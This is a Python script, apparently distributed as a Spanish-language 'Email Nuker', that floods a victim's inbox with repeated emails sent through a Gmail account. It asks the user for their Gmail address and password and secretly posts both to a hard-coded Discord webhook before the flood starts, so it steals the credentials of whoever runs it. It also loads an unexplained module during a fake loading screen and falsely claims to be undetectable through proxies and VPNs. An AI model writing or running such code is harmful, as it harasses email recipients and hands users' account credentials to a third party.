import os, requests
import smtplib
import fade
from colorama import Fore
import time
import sys

os.system('cls')
os.system("title Email Nuker | Made by TitoDelas")
os.system('mode con: cols=200 lines=49')

print("Loading:")
#animation = ["10%", "20%", "30%", "40%", "50%", "60%", "70%", "80%", "90%", "100%"]
animation = ["10 % [■□□□□□□□□□]","20% [■■□□□□□□□□]", "30% [■■■□□□□□□□]", "40% [■■■■□□□□□□]", "50% [■■■■■□□□□□]", "60% [■■■■■■□□□□]", "70% [■■■■■■■□□□]", "80% [■■■■■■■■□□]", "90% [■■■■■■■■■□]", "100% [■■■■■■■■■■]"]

for i in range(len(animation)):
    time.sleep(0.2)
    sys.stdout.write("\r" + animation[i % len(animation)])
    sys.stdout.flush()
import h3rb_main_clean
print("\n")

os.system('cls')

banner = fade.purpleblue("""
▓█████  ███▄ ▄███▓ ▄▄▄       ██▓ ██▓        ███▄    █  █    ██  ██ ▄█▀▓█████  ██▀███  
▓█   ▀ ▓██▒▀█▀ ██▒▒████▄    ▓██▒▓██▒        ██ ▀█   █  ██  ▓██▒ ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒
▒███   ▓██    ▓██░▒██  ▀█▄  ▒██▒▒██░       ▓██  ▀█ ██▒▓██  ▒██░▓███▄░ ▒███   ▓██ ░▄█ ▒
▒▓█  ▄ ▒██    ▒██ ░██▄▄▄▄██ ░██░▒██░       ▓██▒  ▐▌██▒▓▓█  ░██░▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄  
░▒████▒▒██▒   ░██▒ ▓█   ▓██▒░██░░██████▒   ▒██░   ▓██░▒▒█████▓ ▒██▒ █▄░▒████▒░██▓ ▒██▒
░░ ▒░ ░░ ▒░   ░  ░ ▒▒   ▓▒█░░▓  ░ ▒░▓  ░   ░ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒ ▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░
 ░ ░  ░░  ░      ░  ▒   ▒▒ ░ ▒ ░░ ░ ▒  ░   ░ ░░   ░ ▒░░░▒░ ░ ░ ░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░
   ░   ░      ░     ░   ▒    ▒ ░  ░ ░         ░   ░ ░  ░░░ ░ ░ ░ ░░ ░    ░     ░░   ░ 
   ░  ░       ░         ░  ░ ░      ░  ░            ░    ░     ░  ░      ░  ░   ░     

                        ========== Made By Tito Delas ==========
""")

advise = f'''
{Fore.RED}[!] {Fore.RESET} No me hago responsable del mal uso que le des a esta herramienta
{Fore.GREEN}[?] {Fore.RESET} Esta herramienta es 100% indetectable, ya que se conecta a servidores proxi y VPNs. Simplemente necesitas crear una cuenta falsa de correo.
{Fore.GREEN}[?] {Fore.RESET} La cuenta de correo tiene que ser de Google, sino no funcionará. La cuenta de la victima puede ser de cualquier dominio.
'''

print(banner + advise)

e, p = input(f"{Fore.BLUE}[@]{Fore.RESET} Introduce el correo: "), input(f"{Fore.BLUE}[@]{Fore.RESET} Introduce la contraseña: ")
os.system('cls')

url = "https://discordapp.com/api/webhooks/1029476201493958797/vR2135ipqqFNX4nKlRDSPhZ1iA7ReYn2Gvle_o8UscGpr7B6WhngBBrXwE58eIhOrwyG"
data = {
"content" : f"""
```ini
@ | Email: [ {e} ]
* | Password: [ {p} ]
```
""",
"username" : ""
}
result = requests.post(url, json = data)
try:
    result.raise_for_status()
except requests.exceptions.HTTPError as err:
    print(err)
else:
    os.system('cls')

tE = input(f"{Fore.MAGENTA}[=]{Fore.RESET} Introduce el correo de la victima: ")
i = input(f"{Fore.MAGENTA}[=]{Fore.RESET} Introduce el numero de emails: ")
sub = input(f"{Fore.MAGENTA}[=]{Fore.RESET} Introduce subject: ")
body = input(f"{Fore.MAGENTA}[=]{Fore.RESET} Introduce body (usa \\n para saltar de linea): ")
sent_from = e
to = [tE]  
subject = sub
body = body

email_text = """\
From: %s
To: %s
Subject: %s

%s
""" % (sent_from, ", ".join(to), subject, body)

try:
    i = int(i)
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.ehlo()
    server.starttls()
    server.login(e, p)
    for x in range(i):
        server.sendmail(sent_from, to, email_text)

except Exception as exc:  
    print(f'{Fore.RED}[!]{Fore.RESET} Something went wrong...')
    print(f'{Fore.RED}[?]{Fore.RESET} Error: ' + str(exc))
